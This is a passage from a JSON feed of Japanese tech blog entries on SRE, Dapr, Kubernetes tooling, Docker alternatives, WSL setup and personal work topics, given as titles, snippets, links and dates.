に外部リソースのバインディングが可能でそれらをもとにシステムを作成することができます。この章ではそういったdaprの機能や特性を活かしてどのようなアーキテクチャが考えられるかについて書かれた章4. SecurityDaprは追加の機能としてではなくデフォルトで提供します。それらがどのように実装されているかという記載はないですがどうやって実装していくかについて記述がされている。Daprは、シークレット管理、シークレットAPI、相互TLSサポートなどの基本的なセキュリティ機能のセットを提供しています。いくつかの追加のセキュリティ機能のIssueや が挙げれらている。5. ActorsDaprは、クラウドネイティブで復元力のあるプラットフォームに依存しない仮想Actorモデルを提供します。ActorランタイムはDaprランタイム内で実行されるため、Dapr上に言語固有のアクターSDKを簡単に記述でき、他の機能と同様にHTTPまたはgRPCを介して任意の言語からアクターを呼び出すことができます。この章ではActor によるターンベースの同時実行、状態管理、Timer やreminderなどの独自の機能を説明している。Daprがアクターインスタンスを独立したプロセスとしてではなく、同じWebサービス上のルーティングルールとして扱うことです。これにより、Daprは高密度でアクターインスタンスをホストできます。6. Application Patternsdaprのアプリケーションコードは、さまざまなイベントソースからのイベントに応答し、コネクタを介して他のシステムにイベントを送信/受信できます。クラウド環境でどのように利用できるのか？既存のサービスメッシュとどのように協業するのかについて記載がされている章単発で為になる記載もいくつかあったが何回読んでも難しすぎて参考文献になりそうなものを読んだりして行ったり来たりしてる7. Dapr’s Futureシェルスクリプトとしてのdapr の実行やWebAssembly,アクターの各種機能などDapr が将来どのように成長するかを開発者自身が書いてくれている章","link":"https://syu-m-5151.hatenablog.com/entry/2022/01/18/124731","isoDate":"2022-01-18T03:47:31.000Z","dateMiliSeconds":1642477651000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SREチームの作り方と5つの導入ステップを理解する","contentSnippet":"「SREに興味はあるが、どのように取り組めばよいか」と悩んでいる企業の方は多いかと思います。社内にいる人材を駆使して取り組むのか、それとも新しくSREの知識に富んだ人材を雇えばよいのか、またどのように組織を作ればよいかな […]The post SREチームの作り方と5つの導入ステップを理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-team-building-5step/","isoDate":"2022-01-17T10:11:19.000Z","dateMiliSeconds":1642414279000,"authorName":"Sreake","authorId":"Sreake"},{"title":"リソース不足の組織が、SREに取り組む際の3つのポイントについて解説 [SREチーム構築]","contentSnippet":"「自社エンジニア組織においてSREを導入したい」「しかし、リソースの制約により、Googleが行っている『理想的なSRE』を行うのは難しい」 このように考えている企業は多いかと思います。今回は、「制約がある状況下でも、S […]The post リソース不足の組織が、SREに取り組む際の3つのポイントについて解説 [SREチーム構築] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-team-building/","isoDate":"2022-01-17T10:09:49.000Z","dateMiliSeconds":1642414189000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREにおけるトイルの判断と切り分け方","contentSnippet":"SREの導入で重要な項目のひとつに「トイルの削減」が挙げられます。しかし、トイルを削減すると言っても、「トイルをどのように定義し、何をどこまでトイルとして扱うのか」の判別が難しい場合があるかと思います。 そこで、本記事で […]The post SREにおけるトイルの判断と切り分け方 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-toil-select/","isoDate":"2022-01-17T10:09:04.000Z","dateMiliSeconds":1642414144000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREが経営に対して果たす役割・影響について理解する","contentSnippet":"サービスを提供する企業にとって、サービスの信頼性は重要視すべき指標のひとつです。システムの規模に関わらず、運用にかかる工数を減らし、サービスのダウンタイムを減らす取り組みとしてSREを導入する企業も増えてきました。 そこ […]The post SREが経営に対して果たす役割・影響について理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-influence/","isoDate":"2022-01-17T10:07:55.000Z","dateMiliSeconds":1642414075000,"authorName":"Sreake","authorId":"Sreake"},{"title":"脆弱性の指標値を示す「CVSS」について理解する [3つの基準と区分ならび計算方法]","contentSnippet":"システムの脆弱性によるサイバー攻撃が激化している近年、脆弱性対策は極めて重要です。脆弱性対策の重要性を理解していても、脆弱性の正しい分類や重要度の理解に不安を感じている方も多いのではないでしょうか。 脆弱性を判断する国際 […]The post 脆弱性の指標値を示す「CVSS」について理解する [3つの基準と区分ならび計算方法] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/vulnerability-cvss/","isoDate":"2022-01-14T11:08:19.000Z","dateMiliSeconds":1642158499000,"authorName":"Sreake","authorId":"Sreake"},{"title":"有名企業の活用事例から学ぶ「バグバウンティ活用法」","contentSnippet":"バグバウンティとは、システムの脆弱性を発見したバグハンターに対して報酬を支払う仕組みです。システムに惰弱性があると、悪用されて企業が持つ個人情報が漏洩して信頼を損なう可能性があります。 バグバウンティを上手く活用すれば、 […]The post 有名企業の活用事例から学ぶ「バグバウンティ活用法」 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/how-bugbounty-is-used/","isoDate":"2022-01-14T09:07:24.000Z","dateMiliSeconds":1642151244000,"authorName":"Sreake","authorId":"Sreake"},{"title":"telepresence 入門 (2)","contentSnippet":"前回の telepresence 入門 (1) の続きです。今回は Kubernetes クラスタの Service へのアクセスをインターセプトして手元の環境に転送することを試します。Kubernetes 側の volume も手元で mount させるし、","link":"https://blog.1q77.com/2022/01/telepresence-part-2/","isoDate":"2022-01-08T05:27:39.000Z","dateMiliSeconds":1641619659000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2022年01月版キャッシュレス生活まとめ","contentSnippet":"ずいぶん前に書いた私的キャッシュレス生活まとめや、わりと最近書いたお金の流れを図にまとめている話の続編。 最近使っているサービスやカードなどをまとめる。どんな金融サービスを使っているの?工夫している点住信SBIネット銀行の振込無料回数の捻出住信SBIネット銀行は通常、月2回の振込と月1回のATM利用が無料になっている。 住信SBIネット銀行ではスマートプログラムという優遇プログラムが組まれており、ランクを3にすると月10回の振込と月10回のATM利用が無料になる。 スマート認証NEOつまりスマホアプリの登録をしていれば自動的にランク2にランクアップし、月5回の振込と月5回のATM利用が無料になる。 これだけでも普段の生活ではなんら支障がないのだが、なにか振込が必要となった場合に余力がないことがある。 ランク3に上がるには銀行が指定する条件を2つクリアするとよいのだが、我が家では給与振込口座として指定しているほかに、外貨預金の南アフリカランドを1通貨分(約7円)買っている。SBI証券のつみたてNISASBI証券のつみたてNISAは銀行振込による現金積立のほかに、三井住友カードが発行するクレジットカードによる積立を指定することができる。 Amazon Mastercardは三井住友カードが発行しているのでクレカ積立に設定することが可能なのだが、毎月1日に買い付けを行う設定のみ可能となっている。 筆者は証券取引についてあまり知識がないのだが、クレカ積立が毎月1日しか指定できないということは毎月1日付近に株価が上昇してしまい、高値つかみをしてしまうのではないかと考えた。 この行いに意味があるのかないのか正直わからないが、現金積立で毎日買い付けを行うようにしている。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/01/07/000000?utm_source=feed","isoDate":"2022-01-06T15:00:00.000Z","dateMiliSeconds":1641481200000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Docker on Lima","contentSnippet":"以前、「 Lima で nerdctl」という記事を書きました。その後、lima の VM 上で docker daemon を実行し、ホスト側から docker コマンドでアクセスするという方法があることを知りました。","link":"https://blog.1q77.com/2022/01/docker-on-lima/","isoDate":"2022-01-04T16:23:46.000Z","dateMiliSeconds":1641313426000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"telepresence 入門 (1)","contentSnippet":"telepresence というツールがあります。手元の端末が Kubernetes クラスタ内にいるかのような通信を可能にし、Kubernetes の Pod の Container への通信をインターセプトして手元の端末に流すことが","link":"https://blog.1q77.com/2021/12/telepresence-part-1/","isoDate":"2021-12-31T14:54:43.000Z","dateMiliSeconds":1640962483000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"CloudFront のレスポンスに Security Headers を追加する","contentSnippet":"「 Amazon CloudFront が設定可能な CORS、セキュリティ、およびカスタム HTTP レスポンスヘッダーをサポート」で Lambda@Edge なしで Response にカスタムヘッダーを追加することが可能になりました。 これを使","link":"https://blog.1q77.com/2021/12/cloudfront-security-headers/","isoDate":"2021-12-31T07:28:54.000Z","dateMiliSeconds":1640935734000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"WSL2でDNSは8.8.8.8を見つつX Serverを利用する","contentSnippet":"概要VPNを利用するのでDNSサーバーを8.8.8.8に固定したいしかし、X Serverを使うので環境変数DISPLAYにWindowsが解決するホスト名を使用しているexport DISPLAY=\\"$(hostname).mshome.net:0.0\\"DISPLAYにホスト名ではなくIPアドレスを設定しDNSサーバーを固定する DNSサーバーを固定 /etc/wsl.confを作成/etc/wsl.conf[network]generateResolvConf = false /etc/resolv.confを削除$ sudo unli...","link":"https://zenn.dev/tayusa/articles/8a76c02772d0a5","isoDate":"2021-12-28T00:57:59.000Z","dateMiliSeconds":1640653079000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Nuxt.jsを「正しく」終了する","contentSnippet":"はじめにこの記事はNuxt.js Advent Calendar2021の12日目の記事です。11日目は@Skmt3PさんのNuxtのコンポーネントをWeb Componentとして利用するでした。(web component触ってきてないからへぇって気持ちで読まさせていただきました) 概要hooks自体を調べていたときにcloseという項目がありました。そして、説明にはNuxt インスタンスが正しく終了したときというのがありました。「正しく」とは一体…となって原文を見てみるとNuxt instance is gracefully closing.というこ...","link":"https://zenn.dev/satohjohn/articles/fd876409209ed1","isoDate":"2021-12-11T15:35:11.000Z","dateMiliSeconds":1639236911000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"チームのふりかえりをGoogle DrawingsからTrelloに移行した","contentSnippet":"この記事はKyashアドベントカレンダー2021、11日目の記事です。Kyashでは1スプリントを1週間としたスクラム開発を行っており、スプリントのおわりにふりかえり会を開催しています。今回はこれまでGoogle Drawingsを使って行っていたふりかえりをTrelloに移行して効率化した話をまとめます。 これまでのふりかえりこれまでKyashのふりかえりではGoogle Drawingsを利用していました。これはコロナ以前にオフィスでホワイトボードを使って行っていた手法をそのままオンラインに移植した方法で、ホワイトボードや模造紙などに付箋を貼っていくイメージで行っていま...","link":"https://zenn.dev/pranc1ngpegasus/articles/c09049367657ca","isoDate":"2021-12-10T15:00:00.000Z","dateMiliSeconds":1639148400000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Daprつかってみた(Web APIのイメージでローカルストレージとGCSを同じように扱ってみる)","contentSnippet":"この記事は Web API Advent Calendar 2021 の5日目の記事になりますちなみに4日目は@sys_zeroさんのPower Automate for desktopの変数に関するTips「JSONにnull値がある場合の選択的置換」でした今回は、当日まで全く内容について考えられてなかったのですが、ふっと、頭にわいた、個人的に気になっているDaprについて調べて、ローカルストレージとGoogle Cloud Storage(以下GCS)を扱ってみます なんで今回Dapr？Daprを使うメリットの1つとして、他のサービスにつなぐ方法をHTTPまたはgRPCに...","link":"https://zenn.dev/satohjohn/articles/96873574f07534","isoDate":"2021-12-04T15:01:17.000Z","dateMiliSeconds":1638630077000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"SREとはなにか [サイト リライアビリティ エンジニアリング]","contentSnippet":"SREとはなにか SREはどのようなアプローチを用いるか 1.SREチームを組織する 2.SLIを計測しSLOを設定する 3.自動化・省力化するためにプログラムを書く 4.運用を改善する (1)モニタリングの改善 (2) […]The post SREとはなにか [サイト リライアビリティ エンジニアリング] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/what-is-sre/","isoDate":"2021-10-24T16:00:00.000Z","dateMiliSeconds":1635091200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GKE CNI Deep Dive (2021)","contentSnippet":"GKE (Google Kubernetes Engine) のネットワーク周りの実装はユーザーの見えないところで変化を続けています。以前は、公式ドキュメントにあるように bridge interf…","link":"https://qiita.com/toVersus/items/4ff2525d562d8de4d530","isoDate":"2021-10-23T08:20:56.000Z","dateMiliSeconds":1634977256000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"2021年9月 の労働などの振り返り","contentSnippet":"登壇理論と実践からSREを再考するSRE Gaps「理論と実践からSREを再考する」で座談会のファシリテーションを行いました。過去に翻訳刊行された『SRE サイトリライアビリティエンジニアリング』『サイトリライアビリティワークブック』を読んで、SREに取り組む企業が増加しました。がこれらの本で言及されている事例はほとんどがGoogleの事例でした。今月『SREの探求』という本が出ました。この本は、Google以外の会社がSREを導入実践する内容がメインになっております。本のリリースの記念したイベントでもあります。また、本の内容については今後、文章にしていきたいと思ってます(第1章がコンテキストに関する内容でまとめるのめちゃくちゃ難しい)。forkwell.connpass.comsyu-m-5151.hatenablog.com来月は所属組織であるスリーシェイクのイベントでGo言語の可観測性に関する内容で登壇しようと思います。3-shake.connpass.com現状では本を書いてたり書くための技術検証を行なっているので登壇資料に落とし込むかーっと思うなどしてます。次の技術書展は本を出したいと思っているのですが何からはじめればいいんですかね？— nwiizo (@nwiizo) 2021年7月8日  3-shake.com での仕事2021年6月1日に転職して丸4月経過しました。とても、学びと悪戦苦闘の日々を送っており、所属としてはSreake事業部になります。私たちはSREのプロフェッショナルパートナーですSreake（スリーク）は、金融・医療・動画配信・AI・ゲームなど、技術力が求められる領域で豊富な経験を持つSREの専門家が集まったチームです。戦略策定から設計・構築・運用、SaaS提供まで、幅広い領域をサポートします。sreake.com現職では支援事業を行なっており、さまざまなプロジェクトに参加しておりますが、これらが喋っていい内容かどうかは不明なので詳しい技術に関する話はしません。SRE支援事業の感想SREの支援事業をしていて思うことはSREの導入に成功している企業は、Googleが提唱しているSREの概念を理解しつつ、自社の状況やプロダクトのフェーズにあわせて常にSREのあるべき姿を変化させていることです。「SREはこうでなくてはいけない」という固定概念にとらわれず、常に柔軟に変化する意識を持つと良いのではないかと思っている。 変化するものだけが勝つとか誰も言ったことないようなこと言いたいと思います。SREはDevOpsというinterfaceの実装であるまた、SREを実装するうえで技術的な要素はもちろん大切ですが、SREの組織として「どのようにすればうまく状況が共有されるのか」「どのようにすれば横断的な運用管理ができるのか」を考えて行動することも大切ではないかと思います。技術のみに囚われすぎず、定期的なミーティングや組織体制の見直しを行うことで、より良い体制作りができるのではないかと夢想してました。","link":"https://syu-m-5151.hatenablog.com/entry/2021/10/01/171059","isoDate":"2021-10-01T08:10:59.000Z","dateMiliSeconds":1633075859000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"インシデント管理ツール「PagerDuty」とはなにか [特徴・機能・メリット]","contentSnippet":"「PagerDuty」は様々な監視ツールと連携して、システムのインシデントを一元管理するツールです。Googleが提唱するSREを導入する組織が増加するとともに、広く利用されるようになりました。 以下では、インシデント管 […]The post インシデント管理ツール「PagerDuty」とはなにか [特徴・機能・メリット] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/incident-tool-pagerduty/","isoDate":"2021-10-01T02:04:25.000Z","dateMiliSeconds":1633053865000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREとCREの違いを3つのポイントで理解する","contentSnippet":"顧客信頼性エンジニアリングを意味するCRE（Customer Reliability Engineering）とサイト信頼性エンジニアリングを意味するSRE（Site Reliability Engineering）の違 […]The post SREとCREの違いを3つのポイントで理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-cre-difference/","isoDate":"2021-10-01T02:03:40.000Z","dateMiliSeconds":1633053820000,"authorName":"Sreake","authorId":"Sreake"},{"title":"サーバー監視ツール「DataDog」について理解する [特徴・機能・メリット]","contentSnippet":"「DataDog」はSaaS型の運用監視サービスです。可視性の高さ、横断的なモニタリングであらゆるWebサービスの内部状態を監視してくれます。SREの導入時に検討する企業様も多く、近年注目されているサーバー監視ツールのひ […]The post サーバー監視ツール「DataDog」について理解する [特徴・機能・メリット] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/serversurveillance-tool-datadog/","isoDate":"2021-10-01T02:02:43.000Z","dateMiliSeconds":1633053763000,"authorName":"Sreake","authorId":"Sreake"},{"title":"日本企業のSRE事例と成功への3つのポイント","contentSnippet":"SRE（Site Reliability Engineer）と聞くと、まだ身近に感じることができず「海外の大企業が取り入れているサービス運用方法」と考えている方も多いかと存じます。確かにGoogleやNetflix、Am […]The post 日本企業のSRE事例と成功への3つのポイント first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-success/","isoDate":"2021-10-01T02:00:14.000Z","dateMiliSeconds":1633053614000,"authorName":"Sreake","authorId":"Sreake"},{"title":"WSLでGitHubのPersonal access token認証","contentSnippet":"参考https://github.com/microsoft/Git-Credential-Manager-Core#windows-subsystem-for-linux-wsl GitCredentialManagerとGitをインストールPowerShellにて> winget install --id Microtsoft.GitCredentialManagerCore> winget install --id Git.Gitwingetがなければ https://github.com/microsoft/winget-cli#installing...","link":"https://zenn.dev/tayusa/articles/f81e6551642867","isoDate":"2021-09-30T16:01:55.000Z","dateMiliSeconds":1633017715000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"EKS の node で inotify の上限","contentSnippet":"https://github.com/awslabs/amazon-eks-ami/pull/589/files inotify の上限に引っかかり、ssm でログインできなくなったりする。あまり古い EKS AMI を使っていなければ大丈夫","link":"https://blog.1q77.com/2021/10/inode-on-eks-node/","isoDate":"2021-09-30T15:16:00.000Z","dateMiliSeconds":1633014960000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"mac で podman","contentSnippet":"Docker Desktop 代替シリーズ第三部、Podman です。( 第一部 minkikube 編、 第二部 Lima + nerdctl 編) Podman については Red Hat さんのブログが大変参考になります。 今回の Docker 社によるライセンス周りの変更が","link":"https://blog.1q77.com/2021/09/podman-on-mac/","isoDate":"2021-09-23T14:20:51.000Z","dateMiliSeconds":1632406851000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Lima で nerdctl","contentSnippet":"Docker Desktop の代わりに docker cli + Minikube ってのを試しただけど、Kubernetes は docker を非推奨にしてるし、kubernetes は不要な場合は無駄が多いしなあ… ってこ","link":"https://blog.1q77.com/2021/09/lima/","isoDate":"2021-09-19T16:58:10.000Z","dateMiliSeconds":1632070690000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Docker Desktop の代わりに Minikube を使ってみる","contentSnippet":"Docker のおかげで今の便利なコンテナがあります、ありがとうございます。でもどうなるのかやってみたかったんです。 Goodbye Docker Desktop, Hello Minikube! を参考に試してみます。 環境は Intel Mac の Big Sur です。M","link":"https://blog.1q77.com/2021/09/replace-docker-desktop-with-minikube/","isoDate":"2021-09-18T16:07:27.000Z","dateMiliSeconds":1631981247000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Vuexの型定義でモジュールでの型解決してくれるようにしてみた","contentSnippet":"前提Nuxt.jsでVuexを使っているのでそのときにhttps://github.com/ktsn/vuex-type-helper以下を利用させてもらっていましたただ、モジュールのstore場合利用時にtypeがうまくはまらないから、どうするんだろうとか色々見てたのですがあんまりいい手段が見つからなく、自分で型定義でテンプレートリテラル部分書いたらどうなんだろうとおもってやってみました。正直もっと良い手段があると思いますが、今回は自分の勉強踏まえの備忘録。そして、多分Vue3対応とかが入ったらちゃんと動いていくんだと思うので、後で書き換えればいいし、現状型の問題だけな...","link":"https://zenn.dev/satohjohn/articles/b064cf966a9e20","isoDate":"2021-09-11T04:37:38.000Z","dateMiliSeconds":1631335058000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"「理論と実践からSREを再考する」というイベントで司会進行とパネルディスカッションのモデレーターをやる #SREGaps","contentSnippet":"はじめに本日、2021年9月9日19時30分より『SRE Gaps「理論と実践からSREを再考する」』というイベントがあります。私、nwiizoはそこでパネルディスカッションのモデレーターを行うことになりました。forkwell.connpass.com500名以上も参加登録されていてかなり注目されていると思います。SRE という概念を導入する日本企業の開発組織も増えてSREの考え方は多くの場所で取り入れられ、実践されています。 しかし、SRE の実践方法はプロダクトの性質や組織の規模、チーム構成によって異なるほか、 文化としても各企業それぞれ異なる解釈をしている場合が多く存在しており有効に活用されていない現状が見られます。とりあえず、流行っているので「インフラエンジニア」という役職名だけ「SRE」にしており実務としては変わらないままみたいなことが聞こえてきて悲しいです。SREはyaml 管理者のことを指していうわけではないです。ここでインフラエンジニアとSREの違いについて三つ紹介したいと思います。1.業務範囲1つ目は、インフラエンジニアは「インフラのみ」が業務範囲であるのに対して、SREは「信頼性を高める活動全て」が業務範囲である点です。インフラエンジニアは、アプリケーション開発チームが開発したサービスが、「高いパフォーマンスで安定的に稼働する」ための環境を構築し運用することが役割です。よって、インフラの構築・運用・改善は行いますが、アプリケーション側には責任は持ちません。これに対してSREは、「サービスの信頼性を高めるための全ての活動」を行います。具体的には、インフラだけでなくアプリケーション側も業務範囲となるため、アプリケーションのプログラムの修正までSREチームにより行われる場合もあります。また、開発や運用のみならず、組織や文化の醸成といった部分まで責任を持って取り組まれる例が多いのも特徴です。2.スキルセット2つ目は、業務範囲の違いからくる、求められるスキルの違いです。インフラエンジニアは「ITインフラに関する知識や技術力」が求められますが、SREはインフラエンジニアが持つ知見に加えて「アプリケーション開発を行う技術力」や「当該アプリケーションに関する深い知見」が求めれます。求められるスキルの違いは、SREチームの構成にも反映されています。SREを提唱したGoogle は、「SREチームの約半分はGoogle の正規のエンジニアで構成される」としています。つまり、SREチームの半数はアプリケーションエンジニア（または経験者）により構成されるべきとしています。そして残りの半数は「Google の正規エンジニア『予備軍』だが、他のメンバーが持っていないスキルがある」ことを条件としています。ここで指す他のメンバーが持っていない具体的なスキルとしては、「UNIXシステムの内部構造」と「ネットワーク（レイヤー1からレイヤー3）」の専門知識であることが圧倒的に多いです。この辺は2011年に発売されたウェブオペレーション――サイト運用管理の実践テクニックなどを参考にしていただけると非常に参考になると思います。言い換えると、SREチームメンバーの半数は、SREからアプリケーション開発チームに異動しても、そのまま業務を行えるレベルで開発力があるメンバー（または直前までアプリケーションチームに所属していたメンバー）で構築されるべきだということです。一般的なインフラエンジニアの多くは、アプリケーション開発チームに異動したとしても、スキルがマッチしないため、その業務遂行が難しいことを考えると、SREチームは技術力の「深さ」だけでなく「広さ」も求められるといえます。3.方法論3つ目は、方法論の有無です。「インフラエンジニアとは、なにをどのようにして行うべきか」という方法論は、企業により大きく異なります。これに対して、SREは明確な方法論があります。具体的には、上記で紹介したGoogle が自社のSREの紹介サイトhttps://sre.goole/において、『Site Reliability Engineering』という「SREの原典」ともいうべき本を無償で公開しています。これらには日本語版や他の言語のものもあるので全世界のSREは、この「SREの原典」を理解した上で、記載されている方法論に従ってSREの業務を行っています。もちろん、企業ごとに「どこまで原典を文字通りに取り入れてSREを行うか」の違いはありますが、大まかな方法論や用語、考え方は全ての企業で共通しています。vs DevOps というおまけWebサービスの信頼性や価値の向上に用いられるアプローチ方法としてSRE（Site Reliability Engineering）というものがあります。システム開発側と運用側の溝を埋めるために生まれたこの手法ですが、従来のDevOpsとはどのような違いがあるのでしょうか。ついでにSREとDevOpsの違いについて見ていきます。SREとDevOpsの違いや関係性を知るには、Googleが提唱している「class SRE implements DevOps」の考えが最も明解でしょう。「class SRE implements DevOps」は、「SREはDevOpsというinterfaceの実装である」という意味を表します。「DevOps = 思想」という定義に対し、それを具体化し実装したものがSREであるという考えです。この辺は概念的な面も多く「実際、どのようにSREを導入すれば良いのだろう？」や「専任のSREチームなしでSRE原則を適用する方法がない」と思う担当者の方も多いかと思いますのでぜひ、紹介した本を読んでみましょう！さいごに現在、以下の3冊がGoogleから出されています。Site Reliability EngineeringThe Site Reliability WorkbookBuilding Secure & Reliable Systemsこのうち、Site Reliability Engineering と The Site Reliability Workbook は日本語版も出版されております。sre.googleそして、日本語での新たなSRE関連書籍が9月3日に発売されました。ちなみにGoogle からではないです。この書籍は大規模なプロダクションシステムの運用において、様々な企業や組織がSREをどのように実践しているかについて紹介している書籍になります。その本のタイトルは『SREの探求――様々な企業におけるサイトリライアビリティエンジニアリングの導入と実践』 です。私は6月にSRE特化型コンサルティング事業を運営するスリーシェイク社に転職して1ヶ月程無職期間を謳歌していたので他にもSRE関連書籍を読みましたがその中でも今回のイベントのタイトルでもある理論と実践について深く書かれているので原典を読んだ上で読むとめちゃくちゃ面白い書籍だと思います。イベントに参加できなくとも信頼性に関わる全てのエンジニアは読んでも良いと思いました。本イベントでインフラエンジニアからSREと名付けられ旅館で迷子になった無垢な子供が救われることを祈ってます。それでは皆様、イベントでお会いしましょう！また、株式会社スリーシェイクではSRE に関するイベントをやっております。登壇者含めて募集しているので皆さん登録よろしくお願いします。3-shake.connpass.comあとがきSRE Gaps「理論と実践からSREを再考する」は本当に良い発表ばかりだったと思う。自分は本当に何もできずにただただ震えてただけですがなんとかいいイベントになったのではないでしょうか？皆様も感想などありましたらハッシュタグ付けてツイートでもしてください！twitter.com2021/9/9 「SRE Gaps 理論と実践からSREを再考する」イベントリポートsreake.com完全なる宣伝になるんですけど「実際、どのようにSREを導入すれば良いのだろう？」や「専任のSREチームなしでSRE原則を適用する方法がない」と思う担当者の方も多いかと思います。弊社は、金融・医療・動画配信・AI・ゲームなど、特に技術力が求められる領域で豊富な経験を持つSREの専門家が集まったチームです。戦略策定から設計・構築・運用、SaaS提供までSREに必要な要素を統合的に提供可能です。もし少しでもSREに興味があるという企業様がいらっしゃいましたら、気軽にお問い合わせください。sreake.com","link":"https://syu-m-5151.hatenablog.com/entry/2021/09/09/142150","isoDate":"2021-09-09T05:21:50.000Z","dateMiliSeconds":1631164910000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"レビュアーにやさしいPull Requestとはなにか","contentSnippet":"チーム開発をしていると毎日のようにPR(Pull Request)をレビューしたりレビューしてもらったりする。そのなかで目的や解決したいこと、その経緯がわからないものをたまに見かける。レビューに時間がかかると後続のタスクに進めなかったり、積もり積もってリリースまでのリードタイムが長くなったりする。これを改善するにはどうしたらいいのか。答えはPRの質にあると感じるので筆者が日頃から気を付けていることをまとめる。PRのタイトルは短く簡潔に書くたとえば「Userの名前を更新できるようにした」パッとどんなことをしているPRなのかを伝えられるようにするPRのタイトルにない...","link":"https://zenn.dev/pranc1ngpegasus/articles/d188d3b8285ddd","isoDate":"2021-09-05T15:00:00.000Z","dateMiliSeconds":1630854000000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"どんなときに会社を辞めたくなるのか","contentSnippet":"いまは都内に本社を置くIT企業で働いている。日々の業務をこなしているうちに心機一転新しい場所に身を置きたくなったり、ずっとこの会社にいたいなーと思ったりする。同僚のブログを読んで、ある意味で辞めどきの判断基準というか企業に対して求めているものを現職に知っておいてもらうのは大事なんじゃないかと感じた。konifar-zatsu.hatenadiary.jpまだ辞めませんと宣言しつつ、自分はどういうときに辞めたくなるか考えてみる。筆者の性格忘れっぽい興味関心があることに没頭しやすい熱しやすく冷めやすいアドバイスを率直に受けとめる習得までに回数が必要細かい調整や作業が疎かになることがある単刀直入に伝えたいと思うあまりトゲのある言葉遣いになることがあるどんなときに辞めたくなるのか自分の成長を感じられなくなったときいままでやってきたことを再アウトプットしてるだけだなって感じたときある期間で取り組んだ業務をふり返ったときに、なにも特別なことをしていないなと感じたとき自分が雰囲気や士気の邪魔になっているのではないかと感じるとき自分の意思を伝えたいあまり相手を傷つけてしまったのではないかと感じるとき自分さえいなければスムーズに進んでいたのではないかと感じるときxxさんさえいれば安泰だねって思われてるんじゃないかと感じるときずっと専属でやっていたいわけじゃないしかかりつけ医じゃない仕事に意味を感じなくなったとき指示された仕事をこなしてるだけになったとき自分の意思に反するような納得できない仕事をやる期間が続いたときべつに自分じゃなくてもいいよねと感じたときｼｭｯと決めてｼｭｯと解決したいと思っていることの意思決定に時間がかかるときYes/Noだけ答えてくれたらあとはやるだけってときに仮説検証がー、とか運用コストがーとか言われるとき大企業のスタンプラリーみたいに承認プロセスが途方もなく冗長なとき事業の未来を感じなくなったとき明らかに競合他者がデファクトスタンダートだよねと感じるとき自身が関わるプロダクトを自身が使わなくなってしまったときエンジニアとして在籍して企業が向かう先にコミットするにあたって、自分が持っているノウハウや技術をアウトプットするだけでなくインプットも大事にしたいタイプなんだと感じた。じゃあ「事業ドメイン完全に理解した」ってなったら辞めたくなるのかというと、事業にどっぷり没頭していたいとか、事業の将来性とかに左右されそうだなと感じた。5000兆円ほしい。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2021/09/03/213000?utm_source=feed","isoDate":"2021-09-03T12:30:00.000Z","dateMiliSeconds":1630672200000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Kyashではじめての育休を取得した話","contentSnippet":"はじめての子どもである娘が産まれてから慌ただしい日々を過ごしています。産まれてからの2ヶ月間、育児にフルコミットするために会社で初の育児休業を取得したのでまとめます。会社で初の育休を取得するまではじめての子どもを夫婦できちんと育てたいという気持ちが夫婦ともに強かったので、自然と育休取得の話が出てきました。KyashにはSlackに#chat-childrenがあるくらい子育て世代のパパママがたくさん在籍しています。普段からSlackでお迎えやお世話による早退や中抜けのコミュニケーションが多くされており、業務と両立して子育てをしているメンバーが多いです。Kyashでは育休の制度は整備され始めてきていたものの、まだ育休を取得したメンバーがいなかったこともあり、実際に育休を取得する判断をするのは正直少し気がひけました。当時直属のマネージャであったこにふぁーさんに相談したところ、背中を押してくれたこともあり2ヶ月の育休をいただくことにしました。育休の前準備育休に入ると、これまで仕事にあてていた時間を家事 / 